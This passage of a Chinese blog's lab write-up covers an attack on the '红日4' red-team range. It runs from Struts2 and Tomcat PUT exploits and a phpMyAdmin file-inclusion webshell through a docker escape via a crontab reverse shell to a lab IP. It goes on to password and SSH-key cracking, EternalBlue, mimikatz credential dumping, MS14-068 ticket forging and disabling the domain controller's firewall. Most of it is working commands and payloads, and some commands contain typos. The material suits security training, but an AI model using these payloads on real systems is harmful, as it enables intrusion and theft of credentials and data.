src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240830180436309.png" alt="image-20240830180436309"></p><p>抓到域控密码</p><p>zxcASDqw123!!</p><p>再psexec攻击域控</p><p><code>set SMBPASS zxcASDqw123!! </code></p><p><code>set SMBDomain TEST.ORG</code></p><p><code>set RHOSTS 192.168.93.10</code></p><p><code>run</code></p><p><img src="https://bu.dusays.com/2024/10/11/670936f47e28b.png" alt="image-20240830180920238"></p><p>e 不太行</p><h5 id="wmiexec"><a href="#wmiexec" class="headerlink" title="wmiexec"></a>wmiexec</h5><p>这个组件如果我们有账号密码可以直接执行命令</p><p><code>proxychains impacket-wmiexec test/Administrator@192.168.93.10</code></p><p><img src="https://bu.dusays.com/2024/10/11/670936f50aea4.png" alt="image-20240830181401843"></p><p><code>dir /s </code>找下重要文件呢</p><p><img src="https://bu.dusays.com/2024/10/11/670936ed754ba.png" alt="image-20240830181551428"></p><p>找到一个flag.txt</p><p>cd到目标文件夹</p><p>type看下</p><p><img src="https://bu.dusays.com/2024/10/11/670936f054e4d.png" alt="image-20240830181732422"></p><p>拿下</p><h2 id="红日4"><a href="#红日4" class="headerlink" title="红日4"></a>红日4</h2><h3 id="环境配置-2"><a href="#环境配置-2" class="headerlink" title="环境配置"></a>环境配置</h3><p><img src="https://bu.dusays.com/2024/10/11/670937286a79e.png" alt="image-20240830231521018"></p><p>两个仅主机157和183网段的网卡 VM0 VM1</p><p>web </p><p>两张网卡wm1 wm0</p><p><img src="https://bu.dusays.com/2024/10/11/67093737da299.png" alt="image-20240830232009802"></p><p>DC 一张网卡 VM1</p><p><img src="https://bu.dusays.com/2024/10/11/6709372069ac7.png" alt="image-20240830232106911"></p><p>win7 一张网卡 VM1</p><p><img src="https://bu.dusays.com/2024/10/11/670937294faa9.png" alt="image-20240830232410537"></p><p>WEB要等到win7开启来后再开</p><ul><li>web：ubuntu:ubuntu</li><li>DC：administrator:Test2008</li><li>win7：douser:Dotest123</li></ul><p>WIN7要改一下电源计划 默认是10min</p><p>改成从不</p><p><img src="https://bu.dusays.com/2024/10/11/6709372950cdd.png" alt="image-20240830232620131"></p><p>web</p><p>要在root权限后开一下docker</p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240831002654041.png" alt="image-20240831002654041"></p><p>开前三个容器和最后一个容器</p><p>拓扑图</p><p><img src="https://bu.dusays.com/2024/10/11/6709371cd4eb4.png" alt="image-20240830235510228"></p><h3 id="攻击-3"><a href="#攻击-3" class="headerlink" title="攻击"></a>攻击</h3><h4 id="外网-3"><a href="#外网-3" class="headerlink" title="外网"></a>外网</h4><h5 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h5><p>先信息收集吧</p><p><code>netdiscover -r 192.168.157.0/24</code></p><p><img src="https://bu.dusays.com/2024/10/11/67093724a947f.png" alt="image-20240830233444263"></p><p>扫到一个192.168.157.131</p><p>再用nmap扫下这个ip</p><p><code>sudo nmap -p- -A 192.168.157.131 -o result.txt</code></p><p><img src="https://bu.dusays.com/2024/10/11/6709374526ba2.png" alt="image-20240830233651604"></p><p>22开放了ssh</p><p>2001是struts2框架</p><p>2002是Tomcat</p><p>2003是阿帕奇</p><p>访问一下</p><p>2001：</p><p><img src="https://bu.dusays.com/2024/10/11/6709371c7a626.png" alt="image-20240830233904019"></p><p>是一个文件上传</p><h5 id="struts2历史漏洞利用"><a href="#struts2历史漏洞利用" class="headerlink" title="struts2历史漏洞利用"></a>struts2历史漏洞利用</h5><p>struts2存在很多历史漏洞</p><p>可以用这个扫描工具直接扫描并利用</p><p> <a href="https://www.cnsrc.org.cn/threatassessment/1694.html#J_DLIPPCont">Struts2全版本漏洞检测工具</a></p><p><img src="https://bu.dusays.com/2024/10/11/6709374179ae7.png" alt="image-20240830234203174"></p><p>还有这个</p><p><a href="https://github.com/shack2/Struts2VulsTools/releases">shack2&#x2F;Struts2VulsTools</a></p><p><img src="https://bu.dusays.com/2024/10/11/6709371cb2942.png" alt="image-20240830235348644"></p><p>差不多的都可以利用</p><p>这里我们用一个脚本</p><p><a href="https://github.com/xfiftyone/STS2G.git">ST2G</a></p><p>这个需要虚拟机可访问外网 有些依赖需要下载</p><p>因为是go写的 用的时候要go build</p><p><code>./ST2G -h</code></p><p>看下帮助</p><p><img src="https://bu.dusays.com/2024/10/11/6709371def01b.png" alt="image-20240830234519895"></p><p>按照帮助使用</p><p><code>./ST2G --url http://192.168.157.131:2001/ --mode scan</code></p><p><img src="https://bu.dusays.com/2024/10/11/670937286672a.png" alt="image-20240830234718950"></p><p>它扫到了一个Struts2-045</p><p>利用一下</p><p><code>./ST2G --url http://192.168.157.131:2001/ --mode exec --vn 45 --cmd id</code></p><p><img src="https://bu.dusays.com/2024/10/11/6709371cb569a.png" alt="image-20240830235234013"></p><p>利用成功</p><p><code>./ST2G --url http://192.168.157.131:2001/ --mode exec --vn 45 --cmd &quot;ls -al /&quot;</code></p><p>看下根目录呢</p><p><img src="https://bu.dusays.com/2024/10/11/6709371ced864.png" alt="image-20240830235736604"></p><p>发现一个docker的文件</p><p>判断这个web服务是放在docker里面的</p><p>看下权限呢</p><p><code>./ST2G --url http://192.168.157.131:2001/ --mode exec --vn 45 --cmd &quot;whoami&quot;</code></p><p><img src="https://bu.dusays.com/2024/10/11/6709371d74e00.png" alt="image-20240831000114423"></p><p>已经是root权限了</p><p>这个脚本是没有提供反弹的</p><p>我们自己写一个反弹</p><p>看下有没有python呢</p><p><code>./ST2G --url http://192.168.157.131:2001/ --mode exec --vn 45 --cmd &quot;whereis python3&quot;</code></p><p><img src="https://bu.dusays.com/2024/10/11/6709371e842be.png" alt="image-20240831000337206"></p><p>有 </p><p>那我们就可以直接利用python反弹shell了</p><h5 id="Tomcat8-5-19任意文件上传"><a href="#Tomcat8-5-19任意文件上传" class="headerlink" title="Tomcat8.5.19任意文件上传"></a>Tomcat8.5.19任意文件上传</h5><p>看了2001端口</p><p>我们看下这个2002的Tomcat呢</p><p>访问一下</p><p><img src="https://bu.dusays.com/2024/10/11/67093724778ec.png" alt="image-20240831000600299"></p><p>网上搜一下这个版本的汤姆猫的漏洞呢</p><p><img src="https://bu.dusays.com/2024/10/11/6709371e40078.png" alt="image-20240831000729835"></p><p>有一个任意文件上传漏洞</p><p>这是因为它开启了put和head 但又没有做任何过滤</p><p>CVE-2017-12615</p><p>bp抓包</p><p>原始包</p><p><img src="https://bu.dusays.com/2024/10/11/6709372950555.png" alt="image-20240831001436481"></p><p>我们把get改成head</p><p><img src="https://bu.dusays.com/2024/10/11/6709371f9a166.png" alt="image-20240831001459251"></p><p>请求存在</p><p>再看下put</p><p>把head改成put</p><p><img src="https://bu.dusays.com/2024/10/11/670937443615e.png" alt="image-20240831001605543"></p><p>请求存在</p><p>这个漏洞就是我们可以用put进行文件上传</p><p>这里我们随便输点什么</p><p><img src="https://bu.dusays.com/2024/10/11/67093728ecf29.png" alt="image-20240831001713357"></p><p>可以看到 成功了</p><p>并且可以访问成功</p><p><img src="https://bu.dusays.com/2024/10/11/6709371e8f52d.png" alt="image-20240831001806113"></p><p>这样的话我们就可以上传我们的木马文件了</p><p><img src="https://bu.dusays.com/2024/10/11/6709373579dd9.png" alt="image-20240831001927664"></p><p>但是这里有个问题是如果我们直接上传.jsp文件的话 被404了</p><p>明显被过滤了</p><p>绕过：</p><p>加个斜杠就好了</p><p><img src="https://bu.dusays.com/2024/10/11/6709372a1358b.png" alt="image-20240831002053283"></p><p>可以看到</p><p>.jsp&#x2F;传上去没有问题</p><p><img src="https://bu.dusays.com/2024/10/11/6709372069004.png" alt="image-20240831002131126"></p><p>可以正常访问</p><p>好那就哥斯拉生成jsp木马上传</p><p><img src="https://bu.dusays.com/2024/10/11/6709374529009.png" alt="image-20240831002231191"></p><p><img src="https://bu.dusays.com/2024/10/11/6709371cde39f.png" alt="image-20240831002253565"></p><p>可以访问且没有报错</p><p>哥斯拉连接</p><p><img src="https://bu.dusays.com/2024/10/11/670937258ee8e.png" alt="image-20240831002347854"></p><p>成功</p><p><img src="https://bu.dusays.com/2024/10/11/670937258cae9.png" alt="image-20240831002410114"></p><p>命令执行也没有问题</p><p>并且权限是root</p><h5 id="phpMyadmin4-8-1任意文件包含"><a href="#phpMyadmin4-8-1任意文件包含" class="headerlink" title="phpMyadmin4.8.1任意文件包含"></a>phpMyadmin4.8.1任意文件包含</h5><p>访问一下</p><p><img src="https://bu.dusays.com/2024/10/11/670937265d1f0.png" alt="image-20240831002804491"></p><p>熟悉的phpmyadmin</p><p><img src="https://bu.dusays.com/2024/10/11/67093720ae54e.png" alt="image-20240831002833401"></p><p>4.8.1</p><p>搜一下</p><p><img src="https://bu.dusays.com/2024/10/11/67093734bf3ab.png" alt="image-20240831002924658"></p><p>可以看到是存在一个文件包含漏洞</p><p>按找这个打一下</p><p><code>192.168.157.131:2003/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd</code></p><p><img src="https://bu.dusays.com/2024/10/11/670937298beb4.png" alt="image-20240831003238698"></p><p>这里我们包含etc&#x2F;passwd</p><p>包含成功</p><p>那我们应该怎么包含shell呢</p><p>phpMyadmin是可以通过包含session来把历史执行的命令存储</p><p><img src="https://bu.dusays.com/2024/10/11/6709371f1bfb7.png" alt="image-20240831003937228"></p><p>这里我们先执行这个</p><p><code>select &quot;&lt;?php phpinfo();?&gt;&quot;</code></p><p>然后把我们的session拿下来</p><p><img src="https://bu.dusays.com/2024/10/11/670937294e6e6.png" alt="image-20240831004100550"></p><p>这里我们的session是0ea8460f3cd3973a31e0fcdca3bc</p><p>这里session的默认存储路径就是在tmp下</p><p><code>192.168.157.131:2003index.php?target=db_sql.php%253f/../../../../../../../../tmp/sess_0ea8460f3cd3973a31e0fcdca3bc </code></p><p>因为前面我们执行了phpinfo 它就会储存到这个里面 我们再访问这个的话就会执行</p><p><img src="https://bu.dusays.com/2024/10/11/67093745b2b06.png" alt="image-20240831004822444"></p><p>执行成功</p><p>好现在我们来包含一个一句话木马</p><p>这个session已经不能用了</p><p>我们登出 换个session</p><p>写一个一句话木马</p><p><code>select &#39;&lt;?php file_put_contents(&quot;shell.php&quot;, &quot;&lt;?php @eval(\$_POST[1]);?&gt;&quot;);?&gt;&#39;; </code></p><p><img src="https://bu.dusays.com/2024/10/11/670937247875e.png" alt="image-20240831005055900"></p><p>再包含session</p><p><code>192.168.157.131:2003index.php?target=db_sql.php%253f/../../../../../../../../tmp/sess_e8a2616071f4d82a2130bb6fad3f74ad </code></p><p><img src="https://bu.dusays.com/2024/10/11/6709373349f05.png" alt="image-20240831005205238"></p><p>包含成功</p><p><img src="https://bu.dusays.com/2024/10/11/6709371cbe824.png" alt="image-20240831005306911"></p><p>访问没有报错</p><p>hackbar post传1&#x3D;phpinfo();</p><p><img src="https://bu.dusays.com/2024/10/11/670937298c8b6.png" alt="image-20240831005426814"></p><p>执行成功</p><p>那也就可以连接哥斯拉了</p><p>打入成功</p><h4 id="内网-3"><a href="#内网-3" class="headerlink" title="内网"></a>内网</h4><p>这里我们随便用一个漏洞打进去</p><p>连接哥斯拉</p><h5 id="docker逃逸"><a href="#docker逃逸" class="headerlink" title="docker逃逸"></a>docker逃逸</h5><p>前面我们知道了他的web服务是在docker里面</p><p>现在我们必须进行docker逃逸</p><p>先看下当前的挂载磁盘</p><p><code>fdisk -l</code></p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240831163912189.png" alt="image-20240831163912189"></p><p>然后我们新建一个文件夹</p><p>把主机的文件挂载到我们新建的文件夹下 这样我们就可以操作主机</p><p><code>mkdir /test</code></p><p><img src="https://bu.dusays.com/2024/10/11/670937235ab95.png" alt="image-20240831165253953"></p><p><code>mount /dev/sda1 /test</code></p><p>&#x2F;dev&#x2F;sda1 这是主机的默认挂载磁盘</p><p>把sda1 挂载到test里面</p><p><img src="https://bu.dusays.com/2024/10/11/6709371e89e98.png" alt="image-20240831165425933"></p><p>可以看到主机的文件已经挂载过来了</p><p>现在我们有多种手法可以操作主机</p><h6 id="计划任务逃逸"><a href="#计划任务逃逸" class="headerlink" title="计划任务逃逸"></a>计划任务逃逸</h6><p>既然到了跟目录</p><p>我们就可以考虑写一个计划任务来反弹shell</p><p><code>echo &quot;/bin/bash -i &gt;&amp; bash -i &gt;&amp; /dev/tcp/192.168.111.132/4444 0&gt;&amp;1&quot; &gt;&gt; tmp/shell.sh</code></p><p>这行代码将一个字符串写入到tmp&#x2F;shell.sh文件中。这个字符串是一个bash命令，它会启动一个交互式的bash shell，并将其输出重定向到一个TCP连接上。这个连接指向192.168.111.132的4444端口。</p><p><code>chmod 777 tmp/shell.sh</code></p><p>赋权</p><p><code>echo &#39;*/2 * * * * root bash /tmp/shell.sh&#39; &gt; etc/crontab</code></p><p>将一个cron任务添加到etc&#x2F;crontab文件中。这个任务每两分钟执行一次，以root用户的身份运行&#x2F;tmp&#x2F;shell.sh脚本</p><blockquote><ul><li><code>*/2</code>：这是分钟字段，表示任务将在每小时的0分、2分、4分…58分执行。<code>*/2</code>意味着每隔两分钟执行一次。</li><li><code>*</code>：这是小时字段，表示任务将在每个小时执行。单独的<code>*</code>代表所有可能的值（0-23小时）。</li><li><code>*</code>：这是日期字段，表示任务将在每个月的每一天执行。单独的<code>*</code>代表所有可能的值（1-31日）。</li><li><code>*</code>：这是月份字段，表示任务将在每个月执行。单独的<code>*</code>代表所有可能的值（1-12月）。</li><li><code>*</code>：这是星期字段，表示任务将在每周的每一天执行。单独的<code>*</code>代表所有可能的值（0-7，其中0和7都代表周日）。</li><li><code>root</code>：这是执行任务的用户。在这个例子中，任务将以root用户的身份执行。</li><li><code>bash</code>：这是用来执行脚本的解释器。在这个例子中，它指定了使用bash shell来执行后面的脚本。</li><li><code>/tmp/shell.sh</code>：这是要执行的脚本文件的路径。</li></ul><p>综上所述，这行代码的意思是：作为一个root用户，每两分钟执行一次位于<code>/tmp</code>目录下的<code>shell.sh</code>脚本。</p></blockquote><p><img src="https://bu.dusays.com/2024/10/11/67093720f1635.png" alt="image-20240831170301468"></p><p>然后kali监听即可</p><p><img src="https://bu.dusays.com/2024/10/11/6709372900986.png" alt="image-20240831170336723"></p><p>上线</p><p>这样就已经成功逃逸docker</p><h6 id="爆破id-rsa私钥"><a href="#爆破id-rsa私钥" class="headerlink" title="爆破id_rsa私钥"></a>爆破id_rsa私钥</h6><p>ssh中不仅可以直接用账号密码登录</p><p>在ssh中还存放着id_rsa 如果你知道这个的密码也可以进行ssh登录</p><blockquote><p>id_rsa文件存储了用户的私钥</p><p>当用户尝试通过SSH连接到远程服务器时，服务器会使用用户的公钥来加密一个消息，然后发送给用户。用户的SSH客户端会使用id_rsa私钥来解密这个消息。如果解密成功，服务器就知道用户拥有与之配对的私钥，从而验证了用户的身份。</p></blockquote><p>我们先找到ssh的存放路径</p><p><img src="https://bu.dusays.com/2024/10/11/67093721de909.png" alt="image-20240831172232106"></p><p>home下有一个ubuntu</p><p>进去看一眼</p><p><img src="https://bu.dusays.com/2024/10/11/6709371ec6c06.png" alt="image-20240831172330187"></p><p><code>ls -al</code>看下隐藏文件</p><p><img src="https://bu.dusays.com/2024/10/11/670937277c160.png" alt="image-20240831172427467"></p><p>可以看到有一个.ssh文件</p><p>这就是ssh的存放路径</p><p>进去</p><p><img src="https://bu.dusays.com/2024/10/11/67093721ce18b.png" alt="image-20240831172503195"></p><p>找到我们需要的id_rsa</p><p>这个id_rsa.pub是公钥文件</p><p>把id_rsa里面的内容扒下来</p><p>先cat 看下</p><p><img src="https://bu.dusays.com/2024/10/11/670937460414e.png" alt="image-20240831172651274"></p><p>内容拿到kali去爆破</p><p>先新建一个文件来保存</p><p><code>vi id_rsa</code></p><p>用这个</p><p><code>ssh2john id_rsa</code></p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240831172912802.png" alt="image-20240831172912802"></p><p>这可以把我们的id_rsa里的内容转成hash</p><p>保存</p><p><code>ssh2john id_rsa &gt; id_rsa.hash</code></p><p>然后就可以john爆破了</p><p><code>john id_rsa.hash</code></p><p><img src="https://bu.dusays.com/2024/10/11/6709372ad456d.png" alt="image-20240831173127479"></p><p>但是这个比较难爆破啊</p><p>不一定出的来</p><p>给下权限</p><p><code>chmod 600 id_rsa</code></p><p>然后就可以登录了</p><p><code>ssh ubantu@192.168.157.131 -i id_rsa</code></p><p><img src="https://bu.dusays.com/2024/10/11/67093734b4a42.png" alt="image-20240831173506559"></p><p>这里输入的密码就是john爆出的密码</p><h6 id="爆破ssh登录密码"><a href="#爆破ssh登录密码" class="headerlink" title="爆破ssh登录密码"></a>爆破ssh登录密码</h6><p>既然我们都想到了爆破ssh的密钥</p><p>那么我们为什么不直接爆破ssh登录的账号密码呢</p><p>众所周知</p><p>shadow中存放了linux的账号密码</p><p>我们就可以直接爆破shadow</p><p><img src="https://bu.dusays.com/2024/10/11/6709372a5062f.png" alt="image-20240831174420403"></p><p>到etc下 把shadow拿下来</p><p>kali</p><p><code>vi shadow</code></p><p>保存</p><p><code>john shadow</code></p><p>爆破</p><p><img src="https://bu.dusays.com/2024/10/11/67093741c94c5.png" alt="image-20240831174841435"></p><p>不行的话可以这样</p><p><code>john /etc/shadow --wordlist=/usr/share/wordlist/seclists/Passwords/darkweb2017-top10000.txt --format=md5crypt-long</code></p><p>指定字典和数据格式</p><p>通过爆破</p><p>我们可以看到账号密码是 ubuntu ubuntu</p><p>这样我们就可以直接ssh登录了</p><p><code>ssh ubuntu@192.168.157.131</code></p><p><img src="https://bu.dusays.com/2024/10/11/6709372a967d7.png" alt="image-20240831175520411"></p><p>登录成功</p><h6 id="ssh免密登录"><a href="#ssh免密登录" class="headerlink" title="ssh免密登录"></a>ssh免密登录</h6><p>我们可以爆破id_rsa</p><p>那么其实我们可以直接把我们直接的公钥传上去</p><p>这样在私钥和公钥配对我们就可以直接免密登录</p><p>kali显卡http</p><p><code>python3 -m http.server 8080</code></p><p><img src="https://bu.dusays.com/2024/10/11/670937228009f.png" alt="image-20240831175804104"></p><p>靶机wget把kali的公钥下下来</p><p><code>wget http://192.168.93.130:8080/id_rsa.pub</code></p><p><img src="https://bu.dusays.com/2024/10/11/6709373878fef.png" alt="image-20240831175925611"></p><p>公钥拷贝到ubuntu的.ssh中</p><p><code>cp id_rsa.pub /tmp/forest/home/ubuntu/.ssh/authorized_keys</code></p><p><img src="https://bu.dusays.com/2024/10/11/67093744e5fbd.png" alt="image-20240831180048697"></p><p>给公钥赋权</p><p>给authorized_keys 644权限</p><p><img src="https://bu.dusays.com/2024/10/11/67093730174cb.png" alt="image-20240831180138272"></p><p>ssh登录</p><p><img src="https://bu.dusays.com/2024/10/11/6709373dae6f5.png" alt="image-20240831180158878"></p><p>成功</p><h5 id="提权-1"><a href="#提权-1" class="headerlink" title="提权"></a>提权</h5><p><code>ip a</code></p><p>看下网卡</p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240831180605735.png" alt="image-20240831180605735"></p><p>可以看到有外网网卡 也有内网网卡</p><p>看下能不能用sudo呢</p><p><code>sudo -l</code></p><p><img src="https://bu.dusays.com/2024/10/11/6709373800cd0.png" alt="image-20240831180716793"></p><p>ALL!</p><p>那就随便提了</p><p><code>sudo -s</code></p><p><img src="https://bu.dusays.com/2024/10/11/67093726ee421.png" alt="image-20240831180751139"></p><h5 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h5><p>上传fscan扫描一下</p><p>看下有没有wget呢</p><p><code>whereis wget</code></p><p><img src="https://bu.dusays.com/2024/10/11/6709372bb1373.png" alt="image-20240831182904038"></p><p>好</p><p>kali开http</p><p><code>python3 -m http.server 80</code></p><p><img src="https://bu.dusays.com/2024/10/11/67093726e9b12.png" alt="image-20240831183022915"></p><p>把fscan下下来</p><p><code>wget 192168.157.129/fscan</code></p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240831183200543.png" alt="image-20240831183200543"></p><p>给fscan赋权</p><p><code>chmod +x fscan</code></p><p>开扫</p><p><code>,/fscan -h 192.168.183.0/24</code></p><p><img src="https://bu.dusays.com/2024/10/11/6709374566355.png" alt="image-20240831183356325"></p><p><img src="https://bu.dusays.com/2024/10/11/67093735e0b96.png" alt="image-20240831183516574"></p><p>192.168.183.131和192.168.183.130都扫到了永恒之蓝</p><p>可以看到130是DC 并且开了88端口</p><p>88端口可以打ms14-068</p><p>445端口可以打ms17-010</p><p>这里上线msf然后用nmap也是可以的</p><p><code>use auxiliary/scanner/discovery/udp_probe </code></p><p><code>set rhosts 192.168.183.0-255 </code></p><p><code>set threads 5 </code></p><p><code>run</code></p><p>这个可以扫描域内主机</p><p>然后nmap具体扫描就可以</p><h5 id="frp内网穿透"><a href="#frp内网穿透" class="headerlink" title="frp内网穿透"></a>frp内网穿透</h5><p>因为现在我们的网段和内网的网段不一样 不能直接访问</p><p>所以现在我们需要建立一下正向代理</p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240831185033838.png" alt="image-20240831185033838"></p><p>把frp客户端文件传上去</p><p>改下客户端配置文件</p><p><code>vi frpc.ini</code></p><p><img src="https://bu.dusays.com/2024/10/11/6709372de2b50.png" alt="image-20240831185127036"></p><p>看下服务端配置文件</p><p><code>cat frps.ini</code></p><p><img src="https://bu.dusays.com/2024/10/11/67093724ab82c.png" alt="image-20240831185327991"></p><p>监听7000端口</p><p>服务端运行一下</p><p><code>./frps -c ./frps.ini</code></p><p><img src="https://bu.dusays.com/2024/10/11/6709372fb8ebc.png" alt="image-20240831185453918"></p><p>给frpc赋权一下</p><p><code>chmod +x frpc</code></p><p>客户端运行</p><p><code>./frpc -c ./frpc.ini</code></p><p>可以这样</p><p><code>./frpc -c ./frpc.ini &amp;</code></p><p>让他在后台运行</p><p><code>netstat -ntpl | grep 8989</code></p><p>看下8989端口开没</p><p><img src="https://bu.dusays.com/2024/10/11/6709373173105.png" alt="image-20240831185952662"></p><p>开了的</p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240831190605133.png" alt="image-20240831190605133"></p><p>成功</p><h5 id="永恒之蓝-2"><a href="#永恒之蓝-2" class="headerlink" title="永恒之蓝"></a>永恒之蓝</h5><p>这里我们已经可以与内网主机联通了</p><p>我们直接msf打一个永恒之蓝</p><p>设置一下全局代理</p><p><code>setg proxies socks5:127.0.0.1:8989 </code></p><p>这里是攻击机打内网 而内网的主机的网卡是仅主机模式 不能连接外面 而外面可以连接里面</p><p>所以这里我们的payload是正向的bind_tcp</p><p><code>set payload windows/x86/metetpreter/bind_tcp</code></p><p><img src="https://bu.dusays.com/2024/10/11/67093734cd18f.png" alt="image-20240831191501918"></p><p>其他的就一样了</p><p>先打这个win7 192.168.183.131</p><p><img src="https://bu.dusays.com/2024/10/11/6709374544c88.png" alt="image-20240831191729014"></p><p>上线</p><p><code>shell</code></p><p>先看下权限呢</p><p><img src="https://bu.dusays.com/2024/10/11/6709372f80be5.png" alt="image-20240831191853563"></p><p>system权限</p><h5 id="mimikatz抓密码-1"><a href="#mimikatz抓密码-1" class="headerlink" title="mimikatz抓密码"></a>mimikatz抓密码</h5><p>先抓下密码</p><p><code>load kiwi</code></p><p><img src="https://bu.dusays.com/2024/10/11/670937417c98b.png" alt="image-20240831193630891"></p><p>随便抓下</p><p><code>creds_all</code></p><p><img src="https://bu.dusays.com/2024/10/11/67093731312d3.png" alt="image-20240831193813968"></p><p>抓到</p><h5 id="3389远程桌面控制"><a href="#3389远程桌面控制" class="headerlink" title="3389远程桌面控制"></a>3389远程桌面控制</h5><p>抓到了密码 我们就试试远程桌面</p><p>先看下3389端口开没</p><p><code>netstat -nao | findstr 3389</code></p><p><img src="https://bu.dusays.com/2024/10/11/6709372dab8b5.png" alt="image-20240831194506776"></p><p>e 没开</p><p>我们改一下注册表开一下3389端口</p><p><code>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f </code></p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240831194633643.png" alt="image-20240831194633643"></p><p>开启成功了</p><p>再看下3389开没</p><p><img src="https://bu.dusays.com/2024/10/11/6709372dad121.png" alt="image-20240831194713113"></p><p>已经开了</p><p>用proxychains看看能不能控制远程桌面</p><p><code>proxychain rdesktop 192.168.183.131</code></p><p><img src="https://bu.dusays.com/2024/10/11/67093743dd18f.png" alt="image-20240831194955273"></p><p>好连接成功了</p><p>用刚才的账号密码登录一下域用户呢</p><p><img src="https://bu.dusays.com/2024/10/11/67093727c5b32.png" alt="image-20240831195046881"></p><p>咦 怎么不太行</p><p><img src="https://bu.dusays.com/2024/10/11/670937294b166.png" alt="image-20240831195105781"></p><p>要重新验证一下服务器和域之间的关系</p><p>要先解绑一下当前的域 把他切换成工作组 在绑定一下域</p><p>我们先改一下系统管理员的密码</p><p><code>net user administrator Admin12345</code></p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240831195514725.png" alt="image-20240831195514725"></p><p>我们用这个账号密码来登录</p><p>我们登录它的本地 不登录他的域了</p><p><img src="https://bu.dusays.com/2024/10/11/670937286918f.png" alt="image-20240831195637099"></p><p>又报错</p><p><img src="https://bu.dusays.com/2024/10/11/670937258e3b8.png" alt="image-20240831195654574"></p><p>被停用了</p><p>那我们就激活一下</p><p><code>net user administrator /active:yes</code></p><p><img src="https://bu.dusays.com/2024/10/11/6709372dacf92.png" alt="image-20240831195811936"></p><p>再登录</p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240831195923135.png" alt="image-20240831195923135"></p><p>成功</p><p><img src="https://bu.dusays.com/2024/10/11/67093736a3305.png" alt="image-20240831200009701"></p><p>它内置了一些可利用的payload</p><h5 id="ms14-068攻击DC"><a href="#ms14-068攻击DC" class="headerlink" title="ms14-068攻击DC"></a>ms14-068攻击DC</h5><p>我们用ms14-068攻击一下DC</p><p>cd过去</p><p><code>.\MS14-068.exe</code></p><p><img src="https://bu.dusays.com/2024/10/11/670937367b977.png" alt="image-20240831200236336"></p><p>这个需要域用户的sid</p><p>回去找下</p><p>先到域进程里</p><p><code>migrate 2479</code></p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240831200500198.png" alt="image-20240831200500198"></p><p><code>whoami /user</code></p><p><img src="https://bu.dusays.com/2024/10/11/6709373931f30.png" alt="image-20240831200605874"></p><p>拿到sid</p><p>拿完整域名</p><p><img src="https://bu.dusays.com/2024/10/11/67093725c6b06.png" alt="image-20240831200920173"></p><p><code>./MS14-068.exe -u douser@demo.com -p Dotest123 -s S-1-5-21-979886063-1111900045-1414766810-1107 -d 192.168.183.130 -p Dotest123</code> </p><p><img src="https://bu.dusays.com/2024/10/11/6709373ac4b78.png" alt="image-20240831201302532"></p><p>攻击成功</p><p>在本地生成了一个TGT……的缓存</p><p>现在 又用mimikatz抓下票据</p><p><img src="https://bu.dusays.com/2024/10/11/67093737639fb.png" alt="image-20240831214822671"></p><p>不行</p><p>把我们刚刚生成的缓存用ptc导入(高权限票据注入内存)</p><p><code>kerberos::ptc TGT_douser@demo.com.ccache</code></p><p><img src="https://bu.dusays.com/2024/10/11/6709373ed09b8.png" alt="image-20240831215223552"></p><p>再抓下票据</p><p><img src="https://bu.dusays.com/2024/10/11/6709373099b59.png" alt="image-20240831215452963"></p><p>这次抓到了</p><p><code>net view</code></p><p><img src="https://bu.dusays.com/2024/10/11/67093727c5b32.png" alt="image-20240831215927655"></p><p>看下能不能访问到这个域控的C盘呢</p><p><code>dir \\WIN-ENS2VR5TR3N\C$ </code></p><p><img src="https://bu.dusays.com/2024/10/11/670937312fdcd.png" alt="image-20240831220103685"></p><p>成功</p><p>它本地还要一个这个PsExec64.exe</p><p>我们也可以用这个来直接获取域控的cmd</p><p><code>PsExec64.exe /s /accepteula  \\WIN-ENS2VR5TR3N cmd</code></p><p>不行的话还是把票据导入进来</p><p><img src="https://bu.dusays.com/2024/10/11/67093738e0ef0.png" alt="image-20240831220904149"></p><p>成功</p><h5 id="msf上线DC"><a href="#msf上线DC" class="headerlink" title="msf上线DC"></a>msf上线DC</h5><p>刚刚我们扫到域控是有永恒之蓝的</p><p>可以用msf打DC的永恒之蓝</p><p>run</p><p><code>netstat -nao | findstr 4444</code></p><p><img src="https://bu.dusays.com/2024/10/11/6709372baf911.png" alt="image-20240831221226599"></p><p>4444端口已开</p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240831221324180.png" alt="image-20240831221324180"></p><p>但是失败了</p><p>应该是DC开了防火墙</p><p>直接给他防火墙关了</p><p><code>netsh advfirewall set allprofiles state off </code></p><p><img src="https://bu.dusays.com/2024/10/11/670937298de8d.png" alt="image-20240831221532626"></p><p>再打</p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240831221604222.png" alt="image-20240831221604222"></p><p>上线 成功</p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
          <category> 域渗透 </category>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> 学习 </tag>
            
            <tag> 内网 </tag>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DC靶场</title>
      <link href="/2024/10/11/DC%E9%9D%B6%E5%9C%BA/"/>
      <url>/2024/10/11/DC%E9%9D%B6%E5%9C%BA/</url>
      
